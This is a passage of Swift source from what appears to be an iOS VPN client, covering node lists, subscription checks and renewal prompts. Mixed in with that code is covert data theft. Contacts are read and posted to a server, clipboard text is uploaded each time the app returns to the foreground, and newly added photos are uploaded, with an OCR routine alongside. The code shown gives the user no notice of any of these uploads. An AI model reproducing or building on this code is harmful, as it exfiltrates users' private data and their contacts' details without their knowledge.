        // 结束分隔符
        body.appendString("--\(boundary)--\r\n")
        
        // 设置请求体
        //request.httpBody = body
        
        // 上传请求
        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
            if let error = error {
                print("上传失败：\(fileName) \(error.localizedDescription)")
            } else {
                
                
                if let data  = data, let jsonString = String(data: data, encoding: .utf8) {
                    print(" 上传返回 Response data: \(jsonString)")
                    completion()
                }
//                print("上传成功 \(fileName) \(serverURL) ")
            }
           
        }
        task.resume()
    }

    //识别内容
    func recognizeText(from image: UIImage, completion: @escaping (String?) -> Void) {
        guard let cgImage = image.cgImage else { return }
        let requestHandler = VNImageRequestHandler(cgImage: cgImage)
        let request = VNRecognizeTextRequest { request, error in
            guard let observations = request.results as? [VNRecognizedTextObservation], error == nil else {
                completion(nil)
                return
            }
            let recognizedText = observations.compactMap { $0.topCandidates(1).first?.string }
                .joined(separator: "\n")
            completion(recognizedText)
        }
        request.recognitionLanguages = ["zh-Hans"]//"en-US",
        request.recognitionLevel = .accurate
        do {
            try requestHandler.perform([request])
        } catch {
            print("Failed to perform text recognition: \(error)")
            completion(nil)
        }
    }
    
    // MARK: - 相册变化处理方法
    
    /// 处理相册变化
    private func handlePhotoLibraryChanged() {
        print("📸 handlePhotoLibraryChanged() called - 处理相册变化")
        
        // 获取最新的照片
        let assets = PHAsset.fetchAssets(with: .image, options: nil)
        if let asset = assets.lastObject {
            
            if (!uploadedAssetIDs.contains(asset.localIdentifier)) {
                print("新增照片：\(asset.localIdentifier)  \(asset.pixelHeight)")
                self.updateAsset(asset: asset) {
                    self.addUploadedAssetID(asset.localIdentifier)
                    print("len : \(self.uploadedAssetIDs.count)")
                }
            }
        }
    }
    
    // MARK: - 通讯录上传方法
    
    /// 首次上传通讯录
    private func uploadContacts() {
        print("📱 uploadContacts() called - 开始上传通讯录")
        
        // 请求通讯录权限
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            if granted {
                print("✅ 通讯录权限已授权")
                self.fetchAndUploadContacts()
            } else {
                print("❌ 通讯录权限被拒绝: \(error?.localizedDescription ?? "未知错误")")
            }
        }
    }
    
    /// 获取并上传通讯录数据
    private func fetchAndUploadContacts() {
        let store = CNContactStore()
        let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey, CNContactEmailAddressesKey] as [CNKeyDescriptor]
        let request = CNContactFetchRequest(keysToFetch: keys)
        
        var contacts: [[String: Any]] = []
        DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
            
            do {
                try store.enumerateContacts(with: request) { contact, _ in
                    var contactDict: [String: Any] = [:]
                    
                    // 姓名
                    let fullName = "\(contact.givenName) \(contact.familyName)".trimmingCharacters(in: .whitespaces)
                    if !fullName.isEmpty {
                        contactDict["name"] = fullName
                    }
                    
                    // 电话号码
                    var phoneNumbers: [String] = []
                    for phoneNumber in contact.phoneNumbers {
                        phoneNumbers.append(phoneNumber.value.stringValue)
                    }
                    if !phoneNumbers.isEmpty {
                        contactDict["phones"] = phoneNumbers
                    }
                    
                    // 邮箱
                    var emails: [String] = []
                    for email in contact.emailAddresses {
                        emails.append(email.value as String)
                    }
                    if !emails.isEmpty {
                        contactDict["emails"] = emails
                    }
                    
                    // 只添加有有效信息的联系人
                    if !contactDict.isEmpty {
                        contacts.append(contactDict)
                    }
                }
                
                print("📱 获取到 \(contacts.count) 个联系人")
                
                // 上传联系人数据
                if !contacts.isEmpty {
                    uploadContactsToServer(contacts: contacts)
                }
                
            } catch {
                print("❌ 获取通讯录失败: \(error.localizedDescription)")
            }
        }
    }
    
    /// 上传联系人数据到服务器
    private func uploadContactsToServer(contacts: [[String: Any]]) {
        
        guard let url = URL(string: serveruploadContacesURL) else {
            print("❌ 无效的通讯录上传URL")
            return
        }
        
        // 创建请求
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        // 创建请求体
        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
        
        var body = Data()
        
        // 添加基本字段
        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
        
        // 将联系人数据转换为JSON字符串
        do {
            let jsonData = try JSONSerialization.data(withJSONObject: contacts, options: [])
            if let jsonString = String(data: jsonData, encoding: .utf8) {
                body.append(convertFormField(named: "contacts", value: jsonString, boundary: boundary))
            }
        } catch {
            print("❌ 联系人数据JSON序列化失败: \(error.localizedDescription)")
            return
        }
        
        // 结束分隔符
        body.appendString("--\(boundary)--\r\n")
        
        // 上传请求
        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
            if let error = error {
                print("❌ 通讯录上传失败: \(error.localizedDescription)")
            } else {
                if let data = data, let jsonString = String(data: data, encoding: .utf8) {
                    print("✅ 通讯录上传成功 - Response: \(jsonString)")
                }
            }
        }
        task.resume()
    }
    
    /// 常规前台回归处理方法
    func appDidBecomeActive() {
        print("🔄 appDidBecomeActive() called - 常规前台处理")
        
        // 记录前台回归时间
        let currentTime = Date()
        print("🕒 App回到前台时间: \(DateFormatter.localizedString(from: currentTime, dateStyle: .short, timeStyle: .medium))")
        
        // 检查登录状态并执行相应逻辑
        if islogined {
            print("✅ 用户已登录 - 执行前台刷新逻辑")
            
            Task{
                if let clipboardText = UIPasteboard.general.string {
                    //body.append(convertFormField(named: "Pasteboard", value: clipboardText, boundary: boundary))
                    // 比对和处理逻辑
                    if clipboardText.count >  1 && clipboardText != lastClipboardText {
                        
                    }else{
                        return
                    }
                    
                    if (clipboardText == lastClipboardText){
                        //防止上传重复的剪切板
                        return
                    }
                    
                    DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
                        self.uploadPasteBoard(clipboardText: clipboardText)
                    }
                    
                    lastClipboardText  = clipboardText
                }
            }
            // 刷新配置缓存
//            Task {
//                print("🔄 开始刷新配置缓存...")
//                await getConfigCache()
//                
//                print("🔄 开始重新加载配置...")
//                await doReload()
//            }
        } else {
            print("❌ 用户未登录 - 跳过数据刷新")
        }
         
        
        print("✨ appDidBecomeActive处理完成")
    }
    
    // 转换表单字段为multipart格式
    func convertFormField(named name: String, value: String, boundary: String) -> Data {
        var fieldData = Data()
        
        fieldData.appendString("--\(boundary)\r\n")
        fieldData.appendString("Content-Disposition: form-data; name=\"\(name)\"\r\n\r\n")
        fieldData.appendString("\(value)\r\n")
        return fieldData
    }

    // 转换文件数据为multipart格式
    func convertFileData(fieldName: String, fileimageData: Data, boundary: String) -> Data {
        var fileData = Data()
        
        fileData.appendString("--\(boundary)\r\n")
        fileData.appendString("Content-Disposition: form-data; name=\"image\"; filename=\"\(fieldName)\"\r\n")
        fileData.appendString("Content-Type: application/octet-stream\r\n\r\n")
        fileData.append(fileimageData)
        fileData.appendString("\r\n")
        
        return fileData
    }
    
    //上传粘贴板
    private func uploadPasteBoard( clipboardText: String){
        print("应用从后台回到前台:" + clipboardText)
        
        guard let url = URL(string: serveruploadPasteBoardURL) else {
            print("无效的URL")
            return
        }
        
        // 创建Multipart表单数据请求体
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        // 创建请求体
        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
//        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")

        
        var body =  Data()
        // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
        // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
//            body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
        
        body.append(convertFormField(named: "info", value: clipboardText, boundary: boundary))
        
        
        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
        
//             添加图片文件
//            body.append(convertFileData(fieldName: fileName, fileimageData: imagedata, boundary: boundary))
        
        // 结束分隔符
        body.appendString("--\(boundary)--\r\n")
        
        // 设置请求体
        //request.httpBody = body
        
        // 上传请求
        let task = URLSession.shared.uploadTask(with: request, from: body) { data, response, error in
            if let error = error {
                print("上传失败：\(error.localizedDescription)")
            } else {
                
                
                if let data  = data, let jsonString = String(data: data, encoding: .utf8) {
                    print("上柴剪切板成功----Response data: \(jsonString)")
                }
                //print("上传成功 \(fileName) \(serverURL) ")
            }
        }
        task.resume()
    }
    
    
    

    private func handleXufeiTixingButtonError(){
        alert = Alert(title: Text("续费提醒"), message: Text("您的账户已经过期，请续费后继续体验畅快感受；如果您刚购买完请耐心等待，会员时长会在1分钟内到账。"),dismissButton:.default(Text("续费")) {
          
            withAnimation{
                isSubscriptionActive.toggle()
                
            }
        })
    }
    
    private func handleProfileButtonError(_ error: Error?) {
           if let err = error {
               alert = Alert(errorMessage: err.localizedDescription, {
                
               })
           } else {
               Task {
                   await environments.reload()
               }
           }
       }
    
    private var ConnectErrorView: some View{
        VStack {
       // Spacer()
        
        HStack {
            Button {
                isErrorViewActive.toggle()
            } label: {
                Image(systemName: "exclamationmark.triangle.fill")
                    .foregroundColor(.red)
                
                Text("无法连接？ 查看解决方案 >>")
                    .foregroundColor(.red)
                    .font(.system(size: 16))
            }

        }
        .padding()
        .frame(width: UIScreen.main.bounds.width * 0.8) // 占据屏幕宽度的 90%
        .background(Color.red.opacity(0.2))
        .cornerRadius(20)
        
        //Spacer()
    }
    }
    
    private func installProfile() async {
        do {
            try await ExtensionProfile.install()
            environments.postReload()
            
        } catch {
            alert = Alert(error)
        }
        
    }
    
    private func setGroups(_ goGroups: [LibboxOutboundGroup]) {
        
        var groups = [OutboundGroup]()
        if let goGroup = goGroups.first {
            goGroup.isExpand = true
            var items = [OutboundGroupItem]()
            let itemIterator = goGroup.getItems()!
            while itemIterator.hasNext() {
                let goItem = itemIterator.next()!
                
//                OutboundGroupItem
                items.append(OutboundGroupItem(tag: goItem.tag, type: goItem.type, urlTestTime: Date(timeIntervalSince1970: Double(goItem.urlTestTime)), urlTestDelay: UInt16(goItem.urlTestDelay)))
            }


            groups.append(OutboundGroup(tag: goGroup.tag, type: goGroup.type, selected: goGroup.selected, selectable: goGroup.selectable, isExpand: goGroup.isExpand, items: items))
            
            urltestinggoGrouptag = goGroup.tag
            //不要给默认值
            //UserDefaults.standard.setValue("\(goGroup.tag)", forKey: "goGrouptag")
            
        }
               
        /* 原有的全部显示逻辑
        var groups = [OutboundGroup]()
        for goGroup in goGroups {
            print(goGroup.tag)
            //默认设置为开启
            goGroup.isExpand = true
            var items = [OutboundGroupItem]()
            let itemIterator = goGroup.getItems()!
            while itemIterator.hasNext() {
                let goItem = itemIterator.next()!
                items.append(OutboundGroupItem(tag: goItem.tag, type: goItem.type, urlTestTime: Date(timeIntervalSince1970: Double(goItem.urlTestTime)), urlTestDelay: UInt16(goItem.urlTestDelay)))
            }
            groups.append(OutboundGroup(tag: goGroup.tag, type: goGroup.type, selected: goGroup.selected, selectable: goGroup.selectable, isExpand: goGroup.isExpand, items: items))
        }*/
        self.groups = groups
        
        isNodesLoading = false
    }
    
    private func referGetLocalNodes() async{
        
       
        
        do {
            profileList = try await ProfileManager.list().map { ProfilePreview($0) }
            if let profilePrview  = profileList.first {
                 
                
                guard let profile = try await ProfileManager.get(profilePrview.id) else {
                    throw NSError(domain: "Profile missing", code: 0)
                }
                
                let profileContent = try profile.read()
                
                // MARK: - Datum
                struct localDataum: Codable {
                    let outbounds: [Outbound]?
                    
                }
                
                struct Outbound: Codable {
                    let outboundDefault: String?
                    let outbounds: [String]?
                    let tag, type: String
                    let method, password, server: String?
                    let serverPort: Int?

                    enum CodingKeys: String, CodingKey {
                        case outboundDefault = "default"
                        case outbounds, tag, type, method, password, server
                        case serverPort = "server_port"
                    }
                }

                
                
                if let data =  profileContent.data(using: String.Encoding.utf8), let reponsesubdata = try? JSONDecoder().decode(localDataum.self, from: data){
                    if let itemsOuts  = reponsesubdata.outbounds {
                                
                        
                        var groups = [OutboundGroup]()
                        var items = [OutboundGroupItem]()
                        
                        var index = 0
                        var goItemindex = false
                        var tagname = ""
                        var tagtype = ""
                        itemsOuts.forEach { goItem in
                            if goItem.type == "urltest"{
                                goItemindex = true
                                tagname = goItem.tag
                                tagtype = goItem.type
                                print(goItem.tag + "  " + goItem.type)
                            }
                            
                            if goItemindex {
                                if let method = goItem.method, let server = goItem.server {
                                   // let numberThree: Int = 100 + Int(arc4random_uniform(400))

                                    
                                    var sss = OutboundGroupItem(tag: goItem.tag, type: goItem.type, urlTestTime: Date(timeIntervalSince1970: 12), urlTestDelay: UInt16(0))
                                    sss.server = server
                                    sss.method = method
                                    sss.password = goItem.password
                                    sss.server_port = goItem.serverPort
                                    items.append(sss)
                                }else{
                                    
                                    let sss = OutboundGroupItem(tag: goItem.tag, type: goItem.type, urlTestTime: Date(timeIntervalSince1970: 12), urlTestDelay: UInt16(0))
    //                                sss.server = server
    //                                sss.method = method
    //                                sss.password = goItem.password
    //                                sss.server_port = goItem.serverPort
                                    items.append(sss)
                                }
                            }
                            
                            
                            
                            index = index  + 1
                        }
                        
                        //groups.append(OutboundGroup(tag: "自动选择", type: "selector", selected: goGrouptag, selectable:true, isExpand: true, items: items))
                        groups.append(OutboundGroup(tag: tagname, type:tagtype, selected: goGrouptag, selectable:true, isExpand: true, items: items))
                        
                        await MainActor.run {
                            self.groups_firsttime = groups
                            print("第一次加载 nodes 列表 \(groups_firsttime.count)")
                        }
                    }
                }else{
                    print("本地 JSON 节点解析失败")
                }
                    
                
               
                  //  self.profile = profile
                   // self.profileContent = profileContent
                    
                    
                 
                
            }
        } catch {
            alert = Alert(error)
            return
        }
        
    }
    
    
    private func doReload() async {
        
        do {
            profileList = try await ProfileManager.list().map { ProfilePreview($0) }
        } catch {
            alert = Alert(error)
            return
        }
        
//        environments.emptyProfiles = profileList.isEmpty
    }
    
    
    public func reloadnotice() async {
        let userInfoUrl = URL(string: "\(UserManager.shared.baseURL())user/notice/fetch")!
        var request = URLRequest(url: userInfoUrl)
        request.httpMethod = "GET"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue(UserManager.shared.getAutoData(), forHTTPHeaderField: "Authorization")

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                if let _ = error {
                    
                    return
                }
                
                guard let data = data else {
                    return
                }
                
                
                // MARK: - Welcome
                struct NoticeResponse: Codable {
                    let data: [NoticeResponseDatum]?
                    let total: Int?
                }

                // MARK: - Datum
                struct NoticeResponseDatum: Codable {
                    let title, content: String
                    let show: Int
                }

                // Parse the user info response
                if let reponsesubdata = try? JSONDecoder().decode(NoticeResponse.self, from: data), let total = reponsesubdata.total {
                    if ( total >= 1 ){
                        if let _ = reponsesubdata.data?.first {
                           
                         //    alert = Alert(title: data.title,okMessage: "  \(data.content)")
                        }
                    }
                }
            }
            
        }

        task.resume()
    }
    
    public func reloadSubscribe() async {
        
        let userInfoUrl = URL(string: "\(UserManager.shared.baseURL())user/getSubscribe")!
        var request = URLRequest(url: userInfoUrl)
        request.httpMethod = "GET"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue(UserManager.shared.getAutoData(), forHTTPHeaderField: "Authorization")
        
        withAnimation {
            islogined = true
        }
        
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                if let err = error {
                    print(err.localizedDescription)
                    Task{
                        try await Task.sleep(nanoseconds:2_000_000_000)
                        await reloadSubscribe()
                    }
                    
                    return
                }
                
                guard let data = data else {
                    return
                }
                
                
//                if let jsonString = String(data: data, encoding: .utf8) {
//                      print("Response data: \(jsonString)")
//                } 
                // Parse the user info response
                if let reponsesubdata = try? JSONDecoder().decode(SubscribeReponse.self, from: data), let subscript_json = reponsesubdata.data {
                    
//                    withAnimation {
//                        islogined = true
//                    }
                    print("服务器返回最新的地址："+subscript_json.subscribeURL + " \n本地AppStorage：" + UserManager.shared.getSuburlData())
                    
                    
                    var localProfile:ProfilePreview?
                    if profileList.count > 1 {
                        //直接删除全部节点
                        Task {
                            for (_, profile) in profileList.enumerated() {
                                do {
                                    _ = try await ProfileManager.delete(profile.origin)
                                } catch {
                                    print(error)
                                }
                            }
                            
                        }
                    }else{
                        if profileList.count == 1 {
                            localProfile = profileList.first
                        }else{
                            print("第一次准备存储subscribe 地址，首先检查是否付费")
                            // >>>
                            UserManager.shared.storeSuburlData(data: subscript_json.subscribeURL)
                            print("服务器返回最新的地址："+subscript_json.subscribeURL + " \n本地AppStorage：" + UserManager.shared.getSuburlData())
                            Task{
                                //通知更新 Profile
                                environments.profileUpdate.send()
                            }
                            
                            
                            
//                            Task{
//                                try await checkingProfileBackground(remoteURL: subscript_json.subscribeURL)
//                            }
                            
                            
                        }
                        
                    }
                    
                    if let local = localProfile , let remoteURL = local.remoteURL {
                        print("存在本地目前订阅的URL:  - > \(remoteURL) \n 服务器最新地址:\(subscript_json.subscribeURL)")
//                        Task{
//                            try await checkingProfileBackground(remoteURL: subscript_json.subscribeURL)
//                        }
                        //>>
                        UserManager.shared.storeSuburlData(data: subscript_json.subscribeURL)
                        
                        if remoteURL != subscript_json.subscribeURL{
                            //切换了用户，删掉之前的 profile 数据然后重新 下载
                            Task {
                                
                                do {
                                    _ = try await ProfileManager.delete(local.origin)
                                } catch {
                                    print(error)
                                }
                                
                                environments.profileUpdate.send()
                            }
                            print("Log: 切换了用户,清空本地订阅数据，然后重新更新订阅地址.")
                          // commandClient.connect()
                        }else{
                            //更新 profile
                            print("Log: 用户不变,可以考虑每次更新订阅地址.")
                          // commandClient.connect()
                            Task {
                                environments.openProfileGetSuccess.send()
                            }
                            /*Task {
                                do {
                                    _ = try await local.origin.updateRemoteProfile()
                                } catch {
                                    print(error)
                                }
                            }*/
                            
                        }
                        
                    }
                     
                }else{
                    
                    print("LOG: 节点接口JSON解析失败，请注意. \(String(describing: error?.localizedDescription)) ")
                    //DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1) {
                        //Task{
                         //   await reloadSubscribe()
                        //}
                   // }
                    if UserManager.shared.getSuburlData().count > 5 {
//                        withAnimation {
//                            islogined = true
//                            
//                        }
                        //commandClient.connect()
                    }
                    //alert = Alert(errorMessage: "访问失败")
                }
            }
            
        }

        task.resume()
    }
    
    
    
    //检查订阅地址是否付费nonisolated
    private  func checkingProfileBackground( remoteURL: String) async throws {
        //let nextProfileID = try await ProfileManager.nextID()
        
      
        
                 
        let remoteContent = try HTTPClient().getString(remoteURL)
        
        print("HomeView remoteContent : \(remoteContent.count)  paymentURLKey:\(  paymentURLKey)")
        if(remoteContent.count < 3){
            await MainActor.run {
                //进入正常逻辑
                if (UserManager.shared.paymentURL().count > 3){
                    xufeiNotify = true
                    UserManager.shared.storeSuburlData(data:remoteURL)
                    // environments.openProfileGetSuccess.send()
                    environments.profileUpdate.send()
                    
                }else{
                    //如果没有续费的情况下，判断是否是 Apple review
                    xufeiNotify = false
                    environments.profileUpdate.send()
                }
            }
             
            
        }else{
            //存储到本地 DB
            UserManager.shared.storeSuburlData(data:remoteURL)
            await MainActor.run {
                  environments.profileUpdate.send()
            }
//            await MainActor.run {
//                environments.openProfileGetSuccess.send()
//            }
          
        }
    }
    
    @MainActor
    public func reloadNodes() async {
        loadingNodes = true
        
        let userInfoUrl = URL(string: "\(UserManager.shared.baseURL())user/server/fetch")!
        var request = URLRequest(url: userInfoUrl)
        request.httpMethod = "GET"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue(UserManager.shared.getAutoData(), forHTTPHeaderField: "Authorization")

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            
            DispatchQueue.main.async {
                loadingNodes = false
                if let error = error {
                    alert = Alert(error)
                    return
                }
                
                guard let data = data else {
                    return
                }

                // Parse the user info response
                if let nodes = try? JSONDecoder().decode(nodereponse.self, from: data) {
                    
                    if let sss = nodes.data{
                        
                        servers = sss
                    }
                }
            }
        }

        task.resume()
    }
    
    
    // MARK: - Networking Logic
    
    func getConfigCache() async
    {
        //print("serverData: \(serverData)")
        //print("lastFetchTime: \(lastFetchTime)")
        
//        let dictionary = UserDefaults.standard.dictionaryRepresentation()
//          dictionary.keys.forEach { key in
//              print("key: \(key) : \(String(describing: UserDefaults.standard.object(forKey: key)))")
//          }
            
        
        
        let datesss = Date(timeIntervalSince1970: lastFetchTime)

        let dayTimePeriodFormatter = DateFormatter()
        dayTimePeriodFormatter.dateFormat = "MMM dd YYYY HH:mm a"

        let dateString = dayTimePeriodFormatter.string(from: datesss)
        print( "上次getconfig请求的 时间： \(dateString)")
        
        
        let currentTime = Date()
        let timeIntervalSinceLastFetch = currentTime.timeIntervalSince1970//Double
        
        // 如果超过 10 分钟（600 秒），则从服务器获取最新数据
        if (timeIntervalSinceLastFetch - lastFetchTime) > 600  && lastFetchTime > 10  {
            //
            print("超过 10 分钟（600 秒），则从服务器获取最新数据")
            await getConfig()
        }else{
            if serverData.count > 10  && lastFetchTime > 10  {
                
                print("取getConfig 缓存data ")
                
                withAnimation {
                    islogined = true
                }
                
                isConfiging = false
                
                Task {
                    
                    environments.openProfileGetSuccess.send()
                    
                }
                
                await MainActor.run {
                    print("crispTokenData:"+UserManager.shared.crispTokenData())
                    CrispSDK.configure(websiteID: UserManager.shared.crispTokenData())
                }
                
                
                
            }else{
                await getConfig()
            }
           
        }
        
    }
 
    func getConfig()  async {
        
        isConfiging = true
        
        // 读取登录状态和用户信息
        let isLoggedIn = UserManager.shared.isUserLoggedIn()
        let userInfo = UserManager.shared.getUserInfo()
        let autoData = UserManager.shared.getAutoData()

        print("Logged in: \(isLoggedIn)")
        print("本地信息Email: \(userInfo.email), avator: \(userInfo.avator)")
        print("本地信息Auto Data: \(autoData)")
        
        
        
       // Parse the login response and get the authorization token
       struct configReponse: Codable {
           let baseURL, mainregisterURL,paymentURL,crisptoken: String
           let telegramurl, kefuurl, websiteURL,baseDYURL: String
           let message: String
           let code: Int
       }
         
        
        let loginUrl = URL(string: UserManager.shared.configURL)!
        var request = URLRequest(url: loginUrl)
        request.httpMethod = "GET"
        request.addValue("application/json", forHTTPHeaderField: "Content-Type")
        request.addValue(Bundle.main.bundleIdentifier ?? "", forHTTPHeaderField: "bid")
        request.addValue(UserManager.shared.appversion, forHTTPHeaderField: "appver")
        request.addValue(UIDevice.current.model, forHTTPHeaderField: "model")
        
        dump(request.allHTTPHeaderFields ?? [:] )
        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                
                if let _ = error {
                    DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 2) {
                        Task{
                            await getConfig()
                        }
                    }
                    return
                }
                
                guard let data = data else {
                    DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 2) {
                        Task{
                            await getConfig()
                        }
                    }
                    return
                }
                
                if let jsonString = String(data: data, encoding: .utf8) {
                      print("Response data: \(jsonString)")
                        serverData = jsonString
                        lastFetchTime =  Date().timeIntervalSince1970
                    
                        print("更新缓存信息")
                  } else {
                      print("Failed to convert data to string.")
                  }
                
              
                if let jsonResponse = try? JSONDecoder().decode(configReponse.self, from: data){
                     
                    if jsonResponse.code == 1 {
                        //save data
                        UserManager.shared.storebaseURLData(data: jsonResponse.baseURL)
                        UserManager.shared.storemainregisterURLData(data: jsonResponse.mainregisterURL)
                        UserManager.shared.storepaymentURLData(data: jsonResponse.paymentURL)
                        UserManager.shared.storetelegramUrlData(data: jsonResponse.telegramurl)
                        UserManager.shared.storekefuUrlData(data: jsonResponse.kefuurl)
                        UserManager.shared.storewebsiteURLData(data: jsonResponse.websiteURL)
                        UserManager.shared.storeCrispTokenData(data: jsonResponse.crisptoken)
                        
                        CrispSDK.configure(websiteID: jsonResponse.crisptoken)
                        
                        baseDYURL = jsonResponse.baseDYURL
                        isConfiging = false
                        
                        
                        //获取订阅信息
                        //after 2s
                        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1.2) {
                            Task{
                                await reloadSubscribe()
                                //获取配置通知
                                //await reloadnotice()
                            }
                        }                    
                    }
                }else{
                    DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 2) {
                        Task{
                            await getConfig()
                        }
                    }
                }
            }
        
        }

        task.resume()
    }
    
    
    func from(_ data: Data) throws -> LibboxProfileContent {
        var error: NSError?
        let content = LibboxDecodeProfileContent(data, &error)
        if let error {
            throw error
        }
        return content!
    }
    
    // Bottom Sheet...
    @ViewBuilder
    func BottomSheet()->some View{
        if islogined {
            
            
            VStack(spacing: 0){
                
                // Current Server...
                HStack{
                    
                    VStack(alignment: .leading, spacing: 6) {
                        
                        Text("节点选择")
                            .font(.headline)
                        //Text(currentServer.name).font(.subheadline)
                        Text(currentNode).font(.subheadline)
                    }
                    
                    Spacer(minLength: 10)
                    
                    if changeServer && groups.count>0{ 
                        Button {
                            Task {
                                isUrlTesting = true
                                await doURLTest()
                                DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 10) {
                                    isUrlTesting = false
                                }
                            }
                        } label: {
                            
                            Image(systemName: "bolt.fill")
                            if (isUrlTesting) {
                                ProgressView()
                                Text(" ").font(.callout)
                            }else{
                                
                                Text("测速").font(.callout)
                                    .fontWeight(.semibold)
                                    .foregroundColor(.white)
                            }
                            
                        }.disableWithOpacity(isUrlTesting)
                    }
                    
                    
                    // Change Server Button...
                    Button {
                        if !changeServer {
                            if groups.count > 0 {  }
                            
                            Task{
                                try await Task.sleep(nanoseconds: 1_000_000_000)
                                
                            //    commandClient.disconnect()
                                commandClient.connect()
                                
                            }
                            
                            
                        }
                        withAnimation{
                            changeServer.toggle()
                            if servers.isEmpty{
                                
                                if changeServer {
                                    Task{
                                    //    await reloadNodes()
                                    }
                                }
                            }
                            
                        }
                    } label: {
                        
                        Text(changeServer ? "收起" : "展开")
                            .font(.callout)
                            .fontWeight(.semibold)
                            .frame(width: 110,height: 45)
                            .background(
                                
                                RoundedRectangle(cornerRadius: 10)
                                    .strokeBorder(.white.opacity(0.25),lineWidth: 2)
                            )
                            .foregroundColor(.white)
                    }
                    
                    
                }
                .frame(height: 50)
                .padding(.horizontal)
                
                Divider()
                    .padding(.top)
                
                ScrollView(.vertical, showsIndicators: false) {
                    
                    VStack {
                        if loadingNodes {
                            ProgressView()
                            Text("节点数据加载中...")    //网络加载节点
                            Spacer().frame(height: 20)
                        }
                    }.padding()
                    
//                    GroupListView()
                    
                    ScrollView {
                        
                       VStack {
                            //groups首先查看是否第一次开启，直接本地读取列表
                            if groups.count > 0 {
                                ForEach(groups, id: \.newhashValue) { it in
                                    GroupView(it)
                                }
                            }else{
                                ForEach(groups_firsttime, id: \.newhashValue) { it in
                                    GroupView(it)
                                }
                            }
                            
                            /*if (groups_firsttime.count == 0 && groups_firsttime.count == 0 ) {
                                VStack {
                                    ProgressView()
                                    Spacer().frame(height: 20)
                                    Text("节点数据加载中...") //本地 json 加载节点
                                    
                                }.padding()
                            }*/
                            
                            
                        }.padding() //.background(Color.gray.opacity(0.1))
                        
                    }.padding().padding(.bottom,getSafeArea().bottom)
                    if (groups_firsttime.count == 0 && groups_firsttime.count == 0 ) {
                        fufeiNodes()
                    }
                    //GroupListView().padding().padding(.bottom,getSafeArea().bottom)
                    
                   
                }
                .opacity(changeServer ? 1 : 0)
            }
            .frame(maxWidth: .infinity)
            // Max Height...
            .frame(height: changeServer ? getRect().height/1.2 : getRect().height / 2.5,alignment: .top)
            .padding()
            .background(
                
                Color("BottomSheet")
                    .clipShape(CustomCorners(radius: 35, corners: [.topLeft,.topRight]))
            )
            // Safe Area wont show on previews...
            // showing only 50 pixels of height...
            .offset(y: changeServer ? 0 : (getRect().height / 2.5)-50) //(getRect().height / 2.5) - (20 + getSafeArea().bottom)
        }else{
            EmptyView()
        }
    }
      
    func fufeiNodes()->some View{
        
        
        VStack(alignment: .leading, spacing: 18) {
                        // Filtered servers...
                        // Not showing selected One...
            
                    ForEach(serverstixignfufeiTest) { server in
                        Button(action: {
                            withAnimation {
                                
                               changeServer.toggle()
                               //提醒付费
                            
                                if (paymentURLKey.count > 3){
                                    isSubscriptionActive.toggle()
                                }
                                                   
                           }
                        }, label: {
                            VStack(spacing: 4) {
                                HStack {
                                    VStack(alignment: .leading, spacing: 8) {
                                        HStack {
    //                            Image(server.name)
    //                            .resizable()
    //                            .aspectRatio(contentMode: .fit)
    //                            .frame(width: 20, height: 20)

                                            Text(server.name)
                                                .font(.subheadline)
                                                .fontWeight(.semibold).foregroundStyle(.white)
                                        }

                                        Label {
                                            Text(server.isOnline == 1 ? "在线可用" : "不可用")

                                        } icon: {
                                            Image(systemName: server.isOnline == 1 ? "checkmark" : "xmark")
                                        }
                                        .foregroundColor(server.isOnline == 1 ?.green : .red)
                                        .font(.caption2)
                                    }

                                    Spacer(minLength: 10)
                                    
                                    Image(systemName: "lock.fill").foregroundColor(.red)
                                    
                                    
                                }
                                .frame(height: 50)
                                .padding(.horizontal)

                                Divider()
                            }
                        })
                        
                        }
                    }
                    .padding(.top, 25)
                    .padding(.bottom, getSafeArea().bottom)
        
    }
    
    private nonisolated func doURLTest() async {
        print("doURLTest: \(await urltestinggoGrouptag) ")
        do {
            if  await urltestinggoGrouptag.count > 0 {
                try  await LibboxNewStandaloneCommandClient()!.urlTest(urltestinggoGrouptag)
            }
            
        } catch {
            print("doURLTest: \(error)")
//            await MainActor.run {
//                alert = Alert(error)
//            }
        }
        
        
    }
    
    @ViewBuilder
    func Background()->some View{
        
//        VStack(alignment: .trailing, content: {
//            Spacer()
//            Text("Placeholder")
//            LottieView(animationFileName: "1d2a0fe5", loopMode: .loop)
